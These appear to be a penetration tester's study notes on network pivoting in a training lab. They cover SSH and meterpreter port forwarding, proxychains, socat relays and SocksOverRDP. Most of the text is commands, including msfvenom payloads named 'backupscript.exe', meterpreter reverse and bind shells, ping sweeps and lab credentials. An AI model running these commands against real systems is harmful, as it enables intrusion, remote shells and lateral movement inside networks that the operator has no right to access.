
## #SSH local port forwarding
![[Pivotting.png]]
### Scan the pivot target 
```shell
nmap -sT -p22,3306 10.129.202.64
```
### Execute the local Port Forward 
```shell
ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64
```
-L Forward all traffic from the first port to the second
### Confirm Port Forward 
```shell
netstat -antp | grep 1234
```
```shell
nmap -v -sV -p1234 localhost
```
### Forward multiple hosts  
```shell
ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64
```

## SSH Tunnelling over #SOCKS proxy 
To connect to the target machine from the local machine you can start a SOCKS listener on the local host. 
*This is called SSH tunneling over SOCKS proxy*

Allows traffic to be route to the second target via the first machine. 
![[Pivotting over SSH.png]]

#### Dynamic Port forwarding with SSH 

##### Use #Proxychains to send traffic across #proxy 
```shell
ssh -D 9050 ubuntu@10.129.202.64
```
The D argument requests the SSH server to enable dynamic port forwarding. 

```shell
tail -4 /etc/proxychains.conf
```
Add `socks4 127.0.0.1 9050` to the bottom. 
##### #nmap with proxy chains 
```shell
 proxychains nmap -v -sn 172.16.5.1-200
```
##### Proxy chains with metasploit 
```shell
proxychains msfconsole
```
##### Proxychains with xfreerdp
```shell
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
## Remote/Reverse Port Forwarding 
Allows the target to talk back to you
Example payload:
```shell
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```
On the local machine 
```shell
ssh -R <InternalIPofPivotHost>:<multi handler port>:<listenerip>:<lport> <target username>@<ipAddressofTarget> -vN
```


## Meterpreter Tunnelling & Port Forwarding
### Ping Sweeping to search for more hosts 
Run these twice to allow ARP cache to build up
```shell
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```
```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```
```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

```msf
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```
### MSF SOCKS Proxy 
```shell
use auxiliary/server/socks_proxy
```

```shell
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.
```
Check the proxy is running 
```shell-session
msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====
Id  Name    Payload  Payload opts
0   Auxiliary: server/socks_proxy
```
may need to add to /etc/proxychains.conf
```shell
socks4 	127.0.0.1 9050
```
#### Creating Routes 
```shell-session
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```
 or 
 ```shell
run autoroute -s 172.16.5.0/23
```
```shell
run autoroute -p
```
#### Test Connection 
```shell
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```
### Port Forwarding 
create a local TCP relay 
```meterpreter
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```

```shell
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```
### Reverse Port Forwarding 
```shell
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```
Forward requests on port 1234 to listener on port 8081
##### Start a multi handler


## [Socat](https://linux.die.net/man/1/socat) Redirection with a Reverse Shell
Bidirectional relay tool that can create a pipe between 2 network channels. 
### Start #Socat Listener 
Do this on the pivot host 
```shell
socat TCP4-LISTEN:8080,fork TCP4:<local ip>
```

Listen on the local host on port 8080 and forward traffic over port 80

### Create the payload 
```shell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<pivot host ip> -f exe -o backupscript.exe LPORT=8080
```
Start a multi handler on port 80 
## Socat Redirection with a Bind Shell
![[Pivotting MSF.png]]
```shell
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```
Create the payload 

### Socat Bind Listener 
```shell
 socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```
Needs to be the inverse way to ensure traffic is forwarded to the target this time 

Start a multi handler 

Establish a meterpreter session 


## RDP and SOCKS Tunneling with SocksOverRDP
SSH not available?
[SOCKS over RDP](https://github.com/nccgroup/SocksOverRDP)
Uses Dynamic Virtual Channels
### Downloads 
https://github.com/nccgroup/SocksOverRDP/releases
https://www.proxifier.com/download/#win-tab

#### Load SocksOverRDP on pivot host 
```cmd
regsvr32.exe SocksOverRDP-Plugin.dll
```
Connect over RDP using mstsc.exe
Should receive prompt that SocksOverRDP is enabled.

Transfer SocksOverRDP-Server.exe and star with admin privileges. 

Check SOCKS Listener is started 
```cmd
netstat -antb | findstr 1080
```

### Transfer Proxifier over to the pivot host
Profiles > add profile
Configure to forward all packets to 127.0.0.1:1080

